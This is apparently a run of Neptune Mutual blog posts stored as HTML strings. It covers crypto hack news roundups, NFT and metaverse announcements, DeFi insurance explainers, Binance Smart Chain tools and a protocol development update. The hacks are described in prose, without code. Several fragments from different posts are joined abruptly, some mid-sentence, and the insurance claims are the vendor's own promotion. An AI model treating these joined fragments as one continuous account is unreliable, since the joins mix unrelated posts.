of the exchange, including Tether, Polygon, Tesra, and Shiba Inu. Transaction records show that the tokens were subsequently sold on several decentralized exchanges for Ether. The suspected hack followed ZB.com announcing the suspension of deposits and withdrawals in response to the sudden failure of some core applications, with the exchange warning users not to deposit any digital currency until a possible recovery.<br><br>A multimillion-dollar attack took place on the Solana public chain as an increasing number of terrified users realized their wallets had been emptied. The hacker successfully drained nearly $6 million from over 8000 user wallets during a smash and grab raid. The transaction characteristics demonstrate that the attacker signed the account transfer without utilizing the attack contract, and the initial conclusion was that the private key was compromised, suggesting a potential software supply chain issue. It is suggested that users protect the privacy of their private keys and move their hot wallet tokens to a somewhat secure location, such as a hardware wallet.<br></p><h2 id=\"metaverse-and-nfts\">Metaverse, and NFTs </h2><p>Magic Eden, a community-focused NFT marketplace, has just announced that it will be integrating Ethereum NFTs. This is a significant step forward in the platform's efforts to expand its presence across all web3 communities. The platform expects to increase its total traded volume in the coming year by going multi-chain, following its $2 billion in traded volume for Solana NFTs since its launch in September 2021. It also enables NFT creators to launch seamlessly across multiple chains, benefiting from increased liquidity and new audiences. Magic Eden List, which includes a whitelist and audience targeting tool, Launchpad with ETH and SOL compatibility, and a Drop Calendar are among the new Magic Eden - Ethereum Blockchain features. In addition, the platform is running private beta tests in preparation for the launch of a cross-currency trading product. Magic Eden's ETH-compatible Launchpad includes a seamless minting setup, marketing support, and custom launch build-outs.</p><p>Pearson, the educational textbooks publisher, has announced plans to convert its textbooks into NFTs. After finishing their studies, students rarely need their textbooks. As a result, dropping textbook NFTs that can be sold on the secondary market provides Pearson with an excellent opportunity to profit from second-hand sales. This new strategy will help to solidify Pearson's digital strategy after the launch of its Pearson+ subscription application in 2021. Although selling books as NFTs is not a new idea, it is safe to say that book NFTs have not taken off in the same way that music or art NFTs have. This is because many publishers remain wary of NFTs, particularly because their target audience values printed books.</p><p>Popular metaverse platform Decentraland has announced plans to launch the world's first metaverse ATM on August 8 at the Airdrop Tower. The launch event will be hosted by the platform's developers. The metaverse ATM developed in collaboration with the Transak payment gateway and the Metaverse Architects studio will make it easy for users to purchase cryptocurrency. The Transak metaverse ATM by Decentraland is the first fiat-to-cryptocurrency ATM in the world. The goal of the initiative is to facilitate the purchase of MANA and other cryptocurrencies. Developers noted that this adoption is intended to improve the user experience, and that the team is constantly developing the tools and technology required to make payments in Decentraland effortless.</p><p>Tech companies are constantly innovating and experimenting in order to provide users with an interactive and ultra-realistic metaverse experience. The metaverse is not separate from people's actual lives; rather, it is an extension that complements our real world. KuCoin, one of the largest cryptocurrency exchanges, has recently announced its entry into Ertha's metaverse, a project that aims to simulate a real-world environment by simulating the actions that people must perform to live a life. Upon logging into Ertha's early beta, players will be greeted by a state-of-the-art and fully functional KuCoin Office, situated on the initial playable ERTHA NFT Land plot.</p><h2 id=\"onchain-insurance-industry-news\">OnChain Insurance Industry News</h2><p>Ease, formerly ArmorFi, designed their tokenomics with a sustainable architecture based on growing vote tokens (gvTokens). Through their $EASE token deposits, a user may receive an equivalent $gvEASE token, which can be used for voting on governance proposals or staking to a vault to lower the maximum fees for a single hack.</p><p>Bridge Mutual has partnered with Lido Finance, a multi-chain liquid staking solution for Ethereum, Solana, Polkadot, Polygon &amp; Kusama. The collaboration will enable users to purchase coverage for Lido's stETH and underwrite insurance for an attractive yield.</p><hr><h2 id=\"about-us\">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: "<p>Let’s first examine what attributes make DeFi so attractive so that we can understand why so much capital is invested in this space.<br><br>Decentralised finance, or DeFi for short, is a growing ecosystem of financial protocols and applications that are built on the Ethereum blockchain. By utilising Ethereum’s smart contract functionality, DeFi apps provide a wide range of financial services that are typically offered by traditional centralised institutions, such as banks, exchanges, and lending platforms.<br><br>One of the benefits of using DeFi apps is that they are often permissionless, meaning anyone can use them without having to go through a lengthy KYC (know your customer) process. This not only makes it easier for people to access financial services, but also opens up opportunities for those who are underserved by traditional financial institutions.<br><br>The Decentralised nature of DeFi is made possible through the use of smart contracts which are self-executing and do not require the involvement of a third party. Removing the need for intermediaries not only makes for a faster and more efficient process but also removes some significant costs that are charged by financial institutions. Transactions carried out in DeFi are transparent as data stored on the blockchain can be accessed and reviewed by anyone. DeFi also enables users to retain full control over their funds as they are stored on the Ethereum blockchain in a smart contract. The combination of these attributes explains why it is growing so rapidly in popularity not only with individual users but also mainstream financial institutions.<br><br>DeFi, however, is not immune to problems and whilst the attributes of blockchain make blockchain data inherently secure, the smart contracts which are commonly used to interact with the blockchain in decentralised applications, or dApps, can be vectors of attack for cybercriminals. Other vulnerabilities include bridges from one blockchain to another, as well as more traditional cybersecurity weaknesses including phishing links, website/application front end attacks, and social engineering scams that trick people into providing access to their accounts or wallets. Much media attention has been devoted to the theft of digital assets that have arisen from these weaknesses. Unlike traditional finance, where insurance is a precondition of business for most financial entities, in DeFi various constraints and challenges have meant that there are very low levels of adoption of insurance schemes to protect users and investors from incidents. This sets the backdrop for the need for a new approach in the field of DeFi insurance.</p><h2 id=\"what-types-of-digital-assets-are-there-and-what-type-of-risks-do-they-have\">What types of digital assets are there and what type of risks do they have?</h2><p>Broadly speaking, there are two types of digital asset in the blockchain industry:<br><br>1. Cryptocurrencies: These are digital assets that utilise cryptography to secure their transactions and to control the creation of new units. Bitcoin, Ethereum, Litecoin, and Monero are all examples of cryptocurrencies.<br><br>2. Tokens: These are digital assets that are issued on top of existing blockchain platforms. They typically have a specific purpose or use case within the platform they were created for. An example of tokens includes Neptune Mutual’s NPM ERC-20 token that will, when launched, be issued on the Ethereum blockchain.<br><br>Digital assets come in many forms, from cryptocurrencies to NFTs. They each have their own unique risks that need to be considered when selecting an insurance policy. Cryptocurrencies are susceptible to price volatility, hacking, and scams. Lending platforms can be at risk of default or fraud, and algorithmic stablecoins, as we know, run the risk of depegging from the fiat currency they are supposed to be tied to. It's important to select an insurance policy that covers the specific risks of the digital asset you're looking to insure, and it is particularly important to understand what type of insurance you are taking out so that you understand the risks of delay in terms of receiving a payout, and more particularly the risks you run of not receiving any payout whatsoever (read below the paragraph on The Problems of DeFi insurance).</p><h2 id=\"why-is-insurance-important-for-digital-assets\"><br>Why is insurance important for digital assets?</h2><p>Digital assets are often stored in wallets that are connected to the Internet. This makes them vulnerable to hacking and other cyber crimes. In addition, many digital assets are traded on decentralised exchanges that are also built on the Ethereum blockchain. These exchanges are often less secure than traditional centralised exchanges, making them more susceptible to hacks.<br><br>As a result, it’s important to have some form of insurance in place to protect your digital assets from loss or theft.</p><h2 id=\"how-does-a-traditional-insurance-company-work\">How does a traditional insurance company work?</h2><p>A traditional insurance company works by pooling together premiums from many different customers and investing this money in a variety of assets. The income generated from these investments is then used to pay out claims made by policyholders.<br><br>One problem with this model is that it is very centralised, meaning that there are a lot of middlemen involved who take a cut of the premiums and the claims. This not only makes the process expensive, but also slow and bureaucratic. In addition, the traditional insurance model focuses on individuals proving that they have suffered a loss that is covered by the policy and this doesn’t fit well with the DeFi environment in which many users are anonymous, and more particularly events can impact many thousands of people all at the same time, creating a huge and lengthy backlog of work for claims assessors. We will also review an approach called discretionary insurance which is being used by a number of entities to provide protection policies to DeFi users.</p><h2 id=\"discretionary-parametric-solutions\">Discretionary &amp; Parametric Solutions</h2><p>An <strong>insurance mutual</strong> is a type of organisation that is owned by its policyholders. This means that the profits generated by the mutual are distributed back to the policyholders in the form of dividends. One of the advantages of an insurance mutual is that they are typically more aligned with the interests of their policyholders than traditional insurance companies. This is because traditional insurance companies are typically owned by shareholders who are looking for a return on their investment, whereas policyholders are the sole owners of an insurance mutual.  In the case of DeFi insurance mutuals it is important to understand who is bearing the underwriting risks and who shares the returns or losses in the event of claims on the underwriting capital.<br><br><strong>Discretionary insurance</strong> is a type of insurance that pays out based on the discretion of the insurer loss assessors. This means that the insurer will decide whether or not to pay out based on their own discretion, as opposed to a legal obligation based on the insurance policy contract.</p><p><strong>Parametric insurance</strong> is a type of insurance that pays out based on predefined parameters. This means that the payout is not at the discretion of the insurer, but is instead determined by whether the incident conforms to the parameters set out in the cover policy.</p><h2 id=\"the-problems-with-defi-insurance\">The problems with DeFi Insurance</h2><p>In the following blog we highlight a number of challenges facing implementation of insurance solutions in the DeFi space including:</p><ul><li>The mismatch in understanding between the policyholder and the insurer as to the scope of the policy</li><li>How do insurance protocols deal with scalability i.e. how efficient, rapid and reliable is the individual loss assessment process when say 50,000 users suffer a loss at the same time.<br></li></ul><p>We also cover the design principles used by Neptune Mutual in order to solve these problems and create a low risk, reliable and scalable protection solution.

Three of these less well-known problems were described in our blog about understanding underwriting capital, namely:</p><p>Problem 1: Indefinite Lock-ins</p><p>Problem 2: Open-ended risk pools</p><p>Problem 3: Loyal token holders suffer from incidents.</p><p>Again, if you are interested in learning more about becoming an LP then you might to read further about these issues: <a href=\"https://blog.neptunemutual.com/understanding-underwriting-capital-not-all-pools-are-alike-know-a-pool-before-you-jump-in/\">Understanding Underwriting Capital</a></p><h2 id=\"how-to-get-started-with-defi-insurance\">How to Get Started With DeFi Insurance?</h2><p>The first step in getting started with DeFi insurance is to understand the nature of the risks your digital assets are exposed to. This forms the starting point from which you can research how best to mitigate these risks. As we have seen, there are different types of insurance protocols and not only are their protection mechanisms quite different, but they also vary quite significantly in terms of the risks that they cover, so you will need to do some research about the different insurance protocols in the market. A good place to start for this is the list of insurance protocols, and the corresponding TVL (total value locked) provided by DefLlama: <a href=\"https://defillama.com/protocols/Insurance\"><strong>https://defillama.com/protocols/Insurance</strong></a><br><br>The second step is to research insurance protocols and understand their differences and how they operate. At Neptune Mutual we are developing a set of resources in different media forms and channels to help the community understand the risks and solutions being proposed to mitigate these risks. Joining a community interested in security and digital asset protection may be a good starting point, and at Neptune Mutual we have active Discord, Telegram and Twitter communities.<br><br>We also have <a href=\"https://www.youtube.com/c/NeptuneMutual\">YouTube</a> tutorials that explain how to use the Neptune Mutual parametric cover pool marketplace that is available for anyone to try out and use for free on one of the blockchain testnets.<br><br>Finally, we regularly produce and publish content to the blog section of our website.

We refer to a hack or exploit event as an “incident” when it has been reported by a Neptunite community member (NPM token holder) who believes that it has triggered the parameters of a cover pool policy in the Neptune Mutual marketplace.</p><p>The ability to source liquidity is one of the principal factors defining a cover protocol’s ability to scale the amount of protection it is able to offer. In order to provide an optimal solution for certain specific types of project we have added a new class of parametric cover to our protocol called diversified cover pools. &nbsp;This is a very important development as we believe it will open the door to a number of different types of institutional investor and asset manager, as well provide cover policy solutions to a wider group of users.

The new drop which took place on July 30, in celebration of International Friendship Day, commemorated the spirit of friendship, with each collectible being shareable with a friend.

On top of that, developers and users can use most of the existing tools they have been using on Ethereum. For example, you can easily configure <a href="https://docs.binance.org/smart-chain/wallet/metamask.html" rel="noopener ugc nofollow">MetaMask for Binance Smart Chain</a>. Similarly, the <a href="https://app.neptunemutual.com/" rel="noopener ugc nofollow">Neptune Mutual App</a> automatically adds Binance Smart Chain network settings if you haven’t configured it yet or have just installed MetaMask on your browser.</p><p>Due to the low barrier to entry and better user experience, many cryptocurrency users have already started using Binance Smart Chain, and the <a href="https://bscscan.com/chart/address" rel="noopener ugc nofollow">number is rising quickly</a>. Given its compatibility with the Ethereum blockchain, a large portion of Ethereum DeFi developers are considering Binance Smart Chain as their preferred blockchain choice because of less network congestion and better user experience.

A yield farming aggregator aims at optimizing the return for DeFi users once they deposit funds into certain vaults, which decreases the gas fees of moving funds across protocols in order to seek higher yields, as well as boosts returns by automatically compounding any harvested yields. Similar platforms on Ethereum include Yearn and Convex Finance.</p><h3 id="autofarm-vaults">Autofarm Vaults</h3><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/11/autofarm-auto-lp.png" class="kg-image" alt loading="lazy" width="1400" height="1009" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/11/autofarm-auto-lp.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/autofarm-auto-lp.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/autofarm-auto-lp.png 1400w" sizes="(min-width: 720px) 720px"></figure><p>The Autofarm vault enables users to stake cryptocurrencies to generate yields that automatically compound periodically. Autofarm platform consists of both single and multi-asset vaults. The platform optimizes the return on investment by combining the most profitable farms and pools available in the Binance Smart Chain ecosystem. The users who lock cryptocurrencies in the Autofarm vault will also enjoy additional ROI in the $AUTO tokens.</p><p>Vaults in AutoFarm include single-token pools or liquidity-pair (LP) pools. For instance, one of the single-token pools is the AUTO pool, with total value locked equal to $8.95 million. The vault page shows the deposits, estimated annual percentage yield (APY), share of pool, as well as projection of return at different time points (1 day, 1 week, 1 month, etc.). Similarly, a LP pool allows users to stake liquidity pairs formed in different decentralized exchanges, e.g. PancakeSwap. The user interface is similar to that of single-token pools where the amount deposited and APY are clearly shown. Note that liquidity providers may suffer from impermanent loss, which results from change in relative price of the tokens supplied, so the APY for LP pools are generally higher to compensate for the potential risks.</p><p>In return for providing yield optimization strategies, AutoFarm charges various fees for vaults on different chains, e.g. base controller fee, platform fee, vault fee, deposit fee and withdrawal fee.

This is similar to the working principle of 1inch on Ethereum. <strong><strong>Currently, AutoSwap is still in public alpha so please use at your own risks.</strong></strong></p><h3 id="binance-bridge">Binance Bridge</h3><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/11/binance-bridge.png" class="kg-image" alt loading="lazy" width="1400" height="828" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/11/binance-bridge.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/binance-bridge.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/binance-bridge.png 1400w" sizes="(min-width: 720px) 720px"></figure><p>The Binance Bridge is a service provided by Binance that facilitates the conversion of 60+ popular cryptocurrencies from one blockchain to another.

        html: '<p></p><p>For us, June has been one of the most productive months so far. Here is a quick summary of what happened during that month.<br><br>DAO Smart Contracts Development</p><p><a href="https://github.com/neptune-mutual/protocol" rel="noopener ugc nofollow">https://github.com/neptune-mutual/protocol</a></p><p>We’ve made significant progress on the DAO Smart Contract development. Without diving too deep into the topic, we’re covering only a few protocol contracts here:</p><h2 id="cover-and-coverbase-contracts">Cover and CoverBase Contracts</h2><p>The <a href="https://github.com/neptune-mutual/protocol/blob/feature/dev/docs/Cover.md" rel="noopener ugc nofollow">cover contract</a> enables anyone to create and update their cover contracts. When you create a new cover, a dedicated Cover Vault contract gets automatically deployed for managing liquidity. More information on the Vault and VaultPod contracts below.</p><h2 id="staking-contract-cover-fee-and-redemption">Staking Contract, Cover Fee, and Redemption</h2><p>To add a new cover, you need to pay 1000 NEP as the cover creation fee and lock a minimum of 4000 NEP in the staking contract. Through the governance portal, projects can redeem up to 100% of the paid fee at a later date.</p><h3 id="how-to-apply-for-fee-redemption">How to Apply for Fee Redemption?</h3><p><a href="https://docs.neptunemutual.com/covers/cover-fee-redemption" rel="noopener ugc nofollow">https://docs.neptunemutual.com/covers/cover-fee-redemption</a></p><blockquote>As a cover creator, you benefit by earning up to 1% of the cover fees in the pool indefinitely. You can specify the rate (one-time setup) when you create a new cover contract.</blockquote><p>Read the documentation to learn more about the fees:<br><a href="https://docs.neptunemutual.com/covers/contract-creators" rel="noopener ugc nofollow">https://docs.neptunemutual.com/covers/contract-creators</a></p><h2 id="nep-provision-support-for-liquidity-providers">NEP Provision Support for Liquidity Providers</h2><p>The governance portal enables DAO members to provision NEP tokens as Liquidity Pool Support for any given cover. We believe this will foster community participation and will also incentivize liquidity providers. The NEP provision acts as a defense mechanism during cover incidents. Along with the NEP provisions, the liquidity providers also have <strong><strong>Cover Assurance Support</strong></strong> for a rainy day.</p><p>Based on the available liquidity, the provision contract will contribute up to 25% of the suffered loss back to the liquidity pool.</p><h2 id="cover-assurance-support-for-liquidity-providers">Cover Assurance Support for Liquidity Providers</h2><p>When you create a new cover, you can assign any ERC-20 (or BEP-20) token as an assurance token.</p><p>In other words, cover creators can add assurance tokens to prove their support for the cover they created. The assurance token liquidity reduces cover fees, pays liquidity providers during cover incidents, thereby boosting the liquidity provider confidence. Along with the NEP provision token, the assurance tokens are also awarded as a support to the liquidity providers when a cover incident occurs. Without affecting the price much, the protocol will gradually convert the assurance tokens to a stable-coin liquidity.</p><p>Based on the available liquidity, the assurance contract will also award up to 25% of the suffered loss back to the liquidity pool.</p><h2 id="vault-contract">Vault Contract</h2><p>Liquidity providers can earn fees by adding stable-coin liquidity to any cover contract. The cover fees and lending incomes get accumulated and compounded to Cover Vault periodically. The liquidity providers collectively own the Vault.</p><h3 id="fees">Fees</h3><ul><li>Cover fees paid in stable-coin get added to the liquidity pool on finalization (or maturity).</li><li>The protocol supplies a small part of idle assets to lending protocols (from v2 onwards).</li><li>The protocol also enables flash loan borrowing; the received interest gets added back to the pool (from v2 onwards).</li><li>To protect liquidity providers from cover incidents, they can redeem up to 25% of the cover payouts through NEP provision.</li><li>To protect liquidity providers from cover incidents, they can redeem up to 25% of the cover payouts through assurance token allocation.</li></ul><h2 id="vault-pods-proof-of-deposits">Vault PODs (Proof of Deposits)</h2><p>The Vault contract has <strong><strong>_mintPods</strong></strong> and <strong><strong>_redeemPods</strong></strong> features that enable POD minting and burning on demand. As soon as you add liquidity to the Vault, the protocol mints and sends you the POD tokens back. These POD Tokens represent your proportional share of the pool. Similarly, when you redeem your PODs, you get your proportional share of the Vault liquidity back, burning the PODs.</p><h2 id="policy-contract">Policy Contract</h2><p>When you buy a cover, you receive an equal amount of a special token called “cTokens”. You need the cTokens to claim for payouts when resolution occurs. Each unit of cTokens is fully redeemable at a 1:1 ratio to the protocol stable-coins (like wxDai, DAI, USDC, or BUSD) based on which chain you’re using.</p><p>And a lot, lot more …</p>',

        html: '<p>All about blockchain, metaverse, hacks and NFTs</p><h2 id="tldr">TL;DR</h2><ul><li>Crema Finance suffered a flash loan attack losing roughly $8.782 million worth of assets; OpenSea reported their email data breach.</li><li>Facebook began testing NFTs with select content creators in the US.</li><li>KPMG has made its first foray into the metaverse by launching its collaboration hub.</li><li>FC Porto becomes the first European football team to jump into the Upland Metaverse.</li></ul><p>With numerous rug pulls, hacks, exploits, and smart contract vulnerabilities, 2022 has continued to be a busy year for hackers and scammers. The losses in stolen cryptocurrency in the first half of 2022 totaled roughly $2.181 billion, a 208 percent increase over the first half of 2021. In the previous month alone, 21 different DeFi exploits resulted in $227.76 million in stolen funds.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>OpenSea, the world’s largest NFT marketplace, has issued a customer warning after it was discovered that an employee of Customer.io, a platform for managing email newsletters and campaigns, leaked the email addresses of OpenSea customers to an outside party. The breach affected all users who provided their email address to the marketplace, whether for the platform or its newsletter. Following the breach, OpenSea warned customers to be wary of phishing attempts. The platform has also warned users to be cautious, to double-check the website from which you are receiving emails, to keep your password and secret phrase to yourself, and to never sign a wallet transaction directly from an email.</p><p>Hackers attacked and took over Nouns DAO’s Twitter account. Normally, phishing mint attacks in which a hacker gains privileged access and posts a phishing link take place on NFT Discord servers, but in this case, it was carried out on Twitter. The attacker distributed fake phishing links to a bogus raffle for Nouns 355 and 356. This was followed by the attacker creating a Twitter account and inviting listeners to participate in the phishing raffle. Control was regained by Nouns DAO shortly after the developer announced that the Nouns DAO’s Twitter account had been compromised and warned users not to click any links, but 20 people were affected by this attack, with a total loss of 25ETH amounting to $27,843.</p><p>Scammers also targeted JRNYclub’s Twitter account for approximately $82k, where the stolen NFTs were sent to the fraudster’s address. Although their Twitter account was hacked, the attack was classified as a targeted social engineering hack rather than a Sim Swapping attack. According to token officials, a Twitter employee was socially engineered into changing JRNYclub’s password. Following this announcement, some users have claimed that the hacks were the result of an inside job or a malicious Twitter employee.</p><p>A hacker produced a phishing pop-up on Polygon and Fantom warning users their funds were at risk and urging them to enter their private account keys. The hacker accessed Polygon and Fantom’s remote procedure call interfaces through the Web3 infrastructure platform Ankr by tricking a third party domain name system provider into giving the hacker access to Polygon and Fantom’s domains. Posing as an Ankr employee, the hacker sent Gandi, their web service provider a fake identity card and convinced the platform’s customer support service to change the email address for the domain registrar account from Ankr’s to the hacker’s Hotmail account. The attack had been quickly neutralized with Ankr being able to regain control of DNS within six hours of the attack, and all core services were unaffected, however they cannot conclusively determine whether any users fell victim to the phishing attack.</p><p>Crema Finance, the concentrated Liquidity Protocol on Solana, reported that a cyber attack has forced them to halt their program. Information from the on-chain browser SolanaFM was cited by the protocol’s official Twitter account, which stated that the missing encrypted assets were worth $8.782 million. The team later made public the thread that had been targeted, claiming that hackers had gotten over contract checks by setting up a fake account for price change data dubbed Tickaccount, and had then utilized fictitious pricing data and flash loans to steal significant fees from the fund pool.</p><p>Quixotic, the largest NFT platform in the Optimism ecosystem, had smart-contract vulnerabilities that allowed an attacker to steal ERC-20 tokens. According to the leading layer-2 NFT marketplace, no NFTs were affected by the attack, but a greater number of user assets were stolen. In the function of the market contract, only the sell order was checked, while the buyer’s buy order was not checked. As a result, the attacker first created an arbitrary NFT contract, then called the said function to generate a sell order, passing the buyer parameter as the victim’s address and the paymentERC20 parameter as the token address to be stolen, and then transferred the user who is authorized to the market contract. Hackers stole approximately 220,000 OP tokens worth $119,000, exchanged them for USDC, and then transferred them to Tornado Cash via the BNB Chain.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>Meta, formerly known as Facebook, has begun rolling out NFTs to its major social network for some U.S. creators on Ethereum and Polygon networks, with their plans in place to add support for Solana and Flow NFTs to the platform in the near future. Users will have a digital collectibles tab on their Facebook profiles where they can showcase their NFTs, which are unique blockchain tokens that signify ownership. They will also be able to link their cryptocurrency wallets to their Facebook profiles, converting their NFTs into Facebook posts that can be reacted to, liked, commented on, and shared in the same way as any other post.</p><p>KPMG, one of Canada’s and the United States’ Big Four accounting firms, has announced the launch of its first metaverse collaboration hub, as a signature piece, to assist its employees and clients in pursuing growth opportunities in the digital era of web3-based technologies. The hub will be focused on education, collaboration, training, events, and workshops, according to Cliff Justice, KPMG’s U.S. leader of enterprise innovation, who claims that it is already being used for such purposes but that KPMG plans to hire people to build it and expand it over time. The company’s long-term goal is to investigate other potential metaverse use cases, such as health care, consumer, retail, media, and financial services.</p><p>To bring European football to the metaverse, Upland has announced a strategic partnership with FC Porto. The football club will create a virtual stadium in Upland as well as a collectible team and player NFTs as part of this new partnership. Of course, its NFTs, the first suite of NFTs for a European football club, will also be a big draw for fans. However, FC Porto’s entry into Upland will result in the metaverse debut of the Portuguese city of Porto. This means that fans will be able to purchase NFT properties that correspond to their physical addresses. The Dragon Stadium in Upland, Estádio do Drago, will also be the focal point of this. The platform’s unique mechanics will even include player-owned and operated shops on the virtual properties of the metaverse.</p><h2 id="onchain-insurance-industry-news">OnChain Insurance Industry News</h2><p>Sherlock Protocol has announced that it will soon begin to provide smart contract coverage for Euro-denominated deposits from Circle Pay, through Euler Finance. The team has also announced their collaboration with Lyra Finance on the Avalon release. As a result of this collaboration, they will be closely aligned with the Lyra team and their users, providing a full audit, exploit coverage, bug bounty initiatives, and more.</p><p>Risk Harbor has announced the launch of Core Vault 3 for Risk Harbor Core V2 on Fantom. Some of the new features released include but are not limited to Levered Vaults, Automated Market Maker (AMM), and Risk Engine.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: "<p><br>One of the cardinal rules of swimming is to first make sure the water is safe before diving in.  The same rule applies to liquidity pools in the blockchain space. You must be aware of the risks associated with funding an underwriting pool before taking the plunge. Here’s what you need to know.</p><p>Many liquidity providers express dissatisfaction with undefined “lock-ins” and the inability to exit insurance protocols, particularly when this comes as a surprise in what might be called “opaque” liquidity pools.</p><p>The goal of underwriting is to earn a return on capital through its use as a guarantee payment, which obviously is required in the event that the underwritten risk occurs and generates a call on the underwriting capital.  Liquidity providers who are considering investing in insurance protocols must accept the financial risk resulting from the liability arising from such a guarantee. This is generally well understood, however there are other constraints, such as lock-in, that are often far less transparent.<br><br>In this blog, we highlight some of the questions you should ask as a liquidity provider so that you don’t end up jumping into opaque, unsafe waters.</p><h3 id=\"underwriting-capital-pools-not-all-that-glitters-is-gold\">Underwriting Capital Pools: Not All that Glitters is Gold</h3><p>With the resurgence of risk averse behaviours in the crypto <a href=\"https://blog.neptunemutual.com/be-aware-of-the-bear-crypto-crash-heightens-awareness-of-risks-hacks-but-is-this-enough-to-drive-mainstream-adoption-of-digital-asset-protection/\">bear market</a>, insurance protocols are gradually gaining more traction; currently there is over <a href=\"https://defillama.com/protocols/Insurance\">600m USD in TVL</a>. Much of this TVL locks-in liquidity providers in a way that is unexpected and unwelcome for many.<br><br>At Neptune Mutual, we believe that knowledge is key in encouraging people to pool their capital in a cooperative environment. We also believe that insurance protocols will benefit from transparency, communication and a more widespread understanding across the blockchain community of the benefits and risks of both purchasing cover and providing liquidity to underwrite that cover.<br><br>With that in mind, it’s important to understand the <a href=\"https://docs.neptunemutual.com/usage/risk-factors\">risks associated with Neptune Mutual</a> and other DeFi platforms before making any decisions.<br><br>As a liquidity provider, or co-underwriter, you join other LPs to provide a financial guarantee, and in so doing, you share the earning incentives as well as the risk exposure—no different from traditional insurers. <strong>Although there are inherent risks in underwriting, exposure to the risk of being locked-in for an indefinite period is unnecessary. You should have a clear way out.</strong></p><figure class=\"kg-card kg-image-card\"><img src=\"https://blog.neptunemutual.com/content/images/2022/11/capital-pooling-risks.png\" class=\"kg-image\" alt loading=\"lazy\" width=\"1600\" height=\"800\" srcset=\"https://blog.neptunemutual.com/content/images/size/w600/2022/11/capital-pooling-risks.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/capital-pooling-risks.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/capital-pooling-risks.png 1600w\" sizes=\"(min-width: 720px) 720px\"></figure><h3 id=\"problem-1-indefinite-lock-ins\">Problem 1: Indefinite Lock-ins</h3><p>Underwriters must evaluate a number of risks before investing, and indefinite lock-ins should not be one of them: before you get into a pool, make sure you can get out!<br><br>Insurance or cover pools are generally constrained by a minimum ratio in relation to the amount of underwriting capital compared to the amount of payout risks that have been underwritten through policy sales.  This often means that if there is ongoing policy sales activity, and a relative shortage of underwriting capital, then liquidity providers will not be able to withdraw their funds.<br><br>This effect can clearly be seen where insurance protocols try to resolve this lock-in problem by creating a wrapped token of the original project token.   In so doing, projects create a secondary market for the wrapped token to allow LPs to exit their position by selling a wrapped token instead of the original token.   To get an idea of whether LPs are satisfied with their investment as an LP, one just needs to look at the value of the wrapped token in comparison to the project token to see what level of discount LPs are prepared to accept in order to exit their original investment; in some cases, the market price of wrapped insurance protocol tokens represents a  &gt;75% price discount in comparison to the project token, and this demonstrates in monetary terms the extent that LPs are willing to go to in order to exit their position.  In these cases the wrapped token price is probably a far better guide to the actual value of the insurance protocol than the project token itself.</p><p><strong>Our Solution</strong></p><ol><li>Neptune Mutual provides a maximum of 3 months of cover, unlike other DeFi cover protocols that provide up to 12 months. This enables policies to expire progressively over a much shorter time frame, thereby freeing up the underwriting capital so that liquidity providers can withdraw it when they need it.</li><li>The Neptune Mutual protocol has a programmed withdrawal period for liquidity providers that occurs for a duration of 7 days every 180 days.</li><li>Under particular circumstances, Neptune Mutual can pause policy purchases, let covers expire, and allow total liquidity to be withdrawn from pools, plus or minus profits/loss (if payouts happened).</li><li>The POD (proof of deposit) you receive as a stablecoin deposit certificate is an income (or loss) bearing asset. You can sell it in the secondary market if you want to get out. You can redeem your PODs to get your stablecoin back.</li></ol><h3 id=\"problem-2-open-ended-risk-pools\"><br>Problem 2: Open-ended risk pools</h3><p>In many insurance protocols, underwriting liquidity is “pooled”, often to the extent where one pool underwrites all of the different risks covered by the protocol. This means that, as a liquidity provider, you have limited, and usually no power, to decide what type of risks your capital underwrites. <br><br>You may find that the insurance protocol has covered risks that you consider excessive (e.g. financial risks of algorithmic stablecoin de-peg), but even if it hasn't, there is often little you can do if, after providing your underwriting liquidity, the protocol decides to start underwriting progressively greater and more probable risks. <br><br>One has to recognise that there is a temptation on the part of insurance protocols to increase the number of new projects covered in order to increase adoption and cover policy sales, even when projects have a high-level of risk, such as bridge protocols or financial risk.  The consequence of onboarding high risk projects is likely to be felt first and foremost by those who have provided token-based underwriting liquidity.  <br><br>It also means that any incident that arises impacts the return on the liquidity you provided.</p><p><strong>Our Solution</strong></p><ol><li>Neptune Mutual allows you to select which cover pool you want to provide liquidity to; an incident in one pool has no impact on liquidity in other pools.</li><li>Cover pool creation with the Neptune Mutual marketplace is by invitation only.  We thoroughly review all new cover pool projects. We don’t want the marketplace to offer covers that put liquidity providers at excessive risk.</li><li>Neptune Mutual does not provide cover for any financial risks, including but not limited to trading, liquidation, or margin calls, stablecoin de-pegs, private key exploits, wallet hacks, and others. The marketplace focuses exclusively on protecting against on-chain security risks and, to a certain extent, frontend attacks.</li><li>We provide cybersecurity consultation to cover creators in exchange for allocating project native token as staking rewards for our NPM token holder community. This includes a comprehensive security review of smart contracts, frontend, backend, DNS, supply chain, and hosting.</li><li>We have a partnership in place with a DeFi company that provides cover funding to projects that pass our security review. We expect that our liquidity provider community will view this positively and that this will help significantly in bootstrapping liquidity.</li></ol><h3 id=\"problem-3-loyal-token-holders-suffer-from-incidents\">Problem 3: Loyal token holders suffer from incidents</h3><p>Where insurance protocols are using tokens as the reward for providing underwriting liquidity, then the APY returns that you make in tokens can be significantly outweighed by the price movement of the value of the token itself.  <br><br>This is very different from the low risk approach adopted by Neptune Mutual, discussed in our blog “<a href=\"https://blog.neptunemutual.com/be-aware-of-the-bear-crypto-crash-heightens-awareness-of-risks-hacks-but-is-this-enough-to-drive-mainstream-adoption-of-digital-asset-protection/\">Be Aware of the Bear</a>” - read the paragraph entitled “<strong>Minimise Risk</strong>” to see how the design of Neptune Mutual cover pools de-couple token price volatility from liquidity provider returns, making returns to LPs far more transparent. <br><br>It is also important to understand what influences the price of the tokens of different insurance protocols.  In most cases, where tokens 